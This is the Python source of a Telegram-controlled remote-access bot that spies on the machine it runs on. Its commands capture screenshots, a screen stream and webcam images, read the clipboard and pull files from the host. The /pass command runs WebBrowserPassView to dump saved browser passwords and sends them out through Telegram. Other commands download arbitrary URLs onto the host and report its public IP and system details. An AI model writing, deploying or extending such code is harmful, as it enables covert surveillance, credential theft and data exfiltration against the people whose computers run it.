import logging
import platform
import subprocess
import sys
import time
import urllib.request as urllib
from mss import mss
import pyperclip
from aiogram import Bot, Dispatcher, executor, types
from config import admins, token
import cv2
import numpy as np
import pyautogui
import os

admins = set(admins)
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=token)
dp = Dispatcher(bot)


class MSSSource:
    def __init__(self):
        self.sct = mss()

    def frame(self, top, left, width, heigth):
        monitor = {'top': top, 'left': left, 'width': width, 'height': heigth}
        im = np.array(self.sct.grab(monitor))
        im = np.flip(im[:, :, :3], 2)  # 1
        im = cv2.cvtColor(im, cv2.COLOR_BGR2RGB)  # 2
        return True, im

    def release(self):
        pass



@dp.message_handler(commands=["scr"])
async def screen(message: types.Message):
    source = MSSSource()
    if message["from"]["id"] in admins:
        width, height = pyautogui.size()
        ret, frame = source.frame(0, 0,  width, height)
        cv2.imwrite("tmp.png", frame)
        # await message.answer(message.photo())
        with open('tmp.png', 'rb') as photo:
            await message.answer_document(photo)
        os.remove("tmp.png")

@dp.message_handler(commands=["scrsmall"])
async def screensmall(message: types.Message):
    source = MSSSource()
    if message["from"]["id"] in admins:
        width, height = pyautogui.size()
        ret, frame = source.frame(0, 0,  width, height)
        cv2.imwrite("tmp.png", frame)
        # await message.answer(message.photo())
        with open('tmp.png', 'rb') as photo:
            await message.answer_photo(photo)
        os.remove("tmp.png")

@dp.message_handler(commands=["scrstart"])
async def vid(message: types.Message):
    if message["from"]["id"] in admins:
        try:
            args = message.get_args()
        except:
            args = 0
        args = int(args)
        with open('video.cfg', 'w') as f:
            f.write("True")
        source = MSSSource()
        while True:
            with open('video.cfg', 'r') as f:
                state = f.read()
                if state == "True":
                    width, height = pyautogui.size()
                    ret, frame = source.frame(0, 0,  width, height)
                    cv2.imwrite("tmp.png", frame)
                    # await message.answer(message.photo())
                    with open('tmp.png', 'rb') as photo:
                        await message.answer_photo(photo)
                    os.remove("tmp.png")
                    try:
                        time.sleep(args/1000)
                    except:
                        pass

                else:
                    os.remove("video.cfg")
                    break


@dp.message_handler(commands=["scrstop"])
async def stop(message: types.Message):
    with open('video.cfg', 'w') as f:
        f.write("False")


@dp.message_handler(commands=["screen"])
async def screen(message: types.Message):
    if message["from"]["id"] in admins:
        image = pyautogui.screenshot()
        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
        cv2.imwrite("tmp.png", image)
        # await message.answer(message.photo())
        with open('tmp.png', 'rb') as photo:
            await message.answer_document(photo)
        os.remove("tmp.png")


@dp.message_handler(commands=["screensmall"])
async def screensmall(message: types.Message):
    if message["from"]["id"] in admins:
        image = pyautogui.screenshot()
        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
        cv2.imwrite("tmp.png", image)
        # await message.answer(message.photo())
        with open('tmp.png', 'rb') as photo:
            await message.answer_photo(photo)
        os.remove("tmp.png")


@dp.message_handler(commands=["msg"])
async def msg(message: types.Message):
    if message["from"]["id"] in admins:
        msg = message.get_args()
        if len(msg) == 0:
            msg = "Hi!"
        msg = str(msg)

        if os.name == "nt":
            sysroot = os.environ['SystemRoot']
            sysnative = os.path.join(sysroot, 'SysNative')
            if not os.path.exists(sysnative):
                sysnative = os.path.join(sysroot, 'System32')

            msgexe_path = os.path.join(sysnative, 'msg.exe')
            subprocess.call([msgexe_path, '*', msg])
        else:
            os.system('msg *' + msg + "'")


@dp.message_handler(commands=["get"])
async def getFile(message: types.Message):
    if message["from"]["id"] in admins:
        fileName = message.get_args()
        try:
            with open(fileName, 'rb') as f:
                await message.answer_document(f)
        except:
            await message.answer(fileName + " is not file! Or error!")


@dp.message_handler(commands=["send"])
async def send(message: types.Message):
    if message["from"]["id"] in admins:
        args = message.get_args()
        try:
            data = args.split(' ', 1)
            link = data[0]
            fileName = data[1]
        except:
            await message.answer("Error while parsing args")
            return 0

        try:
            urllib.urlretrieve(link, fileName)
        except:
            await message.answer("Error while loading file")
            return 0
        await message.answer("OK")


@dp.message_handler(commands=["pass"])
async def password(message: types.Message):
    if message["from"]["id"] in admins:
        if os.name == "nt":
            subprocess.Popen(['WebBrowserPassView.exe', '/stext', 'pass.txt'])
            with open('pass.txt', 'rb') as passwd:
                await message.answer_document(passwd)
            os.remove('pass.txt')
        else:
            await message.answer("Sorry, only for windows host yet :(")


@dp.message_handler(commands=["sysinfo"])
async def sysinfo(message: types.Message):
    if message["from"]["id"] in admins:
        ip_public = str(urllib.urlopen("http://ip.42.pl/raw").read())
        data = 'OS: ' + platform.uname()[0] + ' ' + platform.uname()[2] + ' - ' + platform.architecture()[0] + '\n'
        data += 'Node: ' + platform.node() + '\n'
        data += 'PC Name: ' + platform.uname()[1] + '\n'
        data += 'Version: ' + platform.uname()[3] + '\n'
        data += 'System Type: ' + platform.uname()[4] + '\n'
        data += 'Description: ' + platform.uname()[5] + '\n'
        data += 'Public IP: ' + ip_public + '\n'
        data += '\n'
        await message.answer(data)


@dp.message_handler(commands=["info"])
async def info(message: types.Message):
    if message["from"]["id"] in admins:
        cpu = platform.processor()
        system = platform.system()
        machine = platform.machine()
        data = cpu + '\n'
        data += system + '\n'
        data += machine + '\n\n'
        await message.answer(data)


@dp.message_handler(commands=["clip"])
async def clip(message: types.Message):
    if message["from"]["id"] in admins:
        cb = pyperclip.paste()
        await message.answer(cb)
        try:
            size = os.path.getsize(cb)

            if size < 1024:
                size = str(size) + "B"
            else:
                size = size / 1024
                size = round(size, 2)
                if size < 1024:
                    size = str(size) + "KB"
                else:
                    size = size / 1024
                    size = round(size, 2)
                    if size < 1024:
                        size = str(size) + "MB"
                    else:
                        size = size / 1024
                        size = round(size, 2)
                        if size < 1024:
                            size = str(size) + "GB"
            data = "This is file. Size: " + str(size) + "\n"
            data += "Use /clipfile to send it. BE CAREFUL!"
            await message.answer(data)
        except:
            pass


@dp.message_handler(commands=["clipfile"])
async def clipfile(message: types.Message):
    if message["from"]["id"] in admins:
        cb = pyperclip.paste()
        try:
            with open(cb, 'rb') as cbfile:
                await message.answer_document(cbfile)
        except:
            await message.answer(cb)


@dp.message_handler(commands=["cap"])
async def getcap(message: types.Message):
    if message["from"]["id"] in admins:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite("cap.png", frame)
        # await message.answer(message.photo())
        with open('cap.png', 'rb') as photo:
            await message.answer_document(photo)
        os.remove("cap.png")


@dp.message_handler(commands=["capsmall"])
async def getcap(message: types.Message):
    if message["from"]["id"] in admins:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite("cap.png", frame)
        # await message.answer(message.photo())
        with open('cap.png', 'rb') as photo:
            await message.answer_photo(photo)
        os.remove("cap.png")


@dp.message_handler(commands=["ls"])
async def ls(message: types.Message):
    if message["from"]["id"] in admins:
        args = message.get_args()
        pwd = subprocess.run(['pwd'], stdout=subprocess.PIPE)
        if len(args) == 0:
            result = subprocess.run(['ls'], stdout=subprocess.PIPE)
        else:
            result = subprocess.run(['ls', args], stdout=subprocess.PIPE)
        string = result.stdout.decode('utf-8')
        pwdstr = pwd.stdout.decode('utf-8')
        string.replace("\n", "  ")
        pwdstr.replace("\n", "  ")
        try:
            await message.answer(pwdstr + "\n" + string)
            # await message.answer(string)
        except:
            await message.answer("Errcode " + str(result.returncode))


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
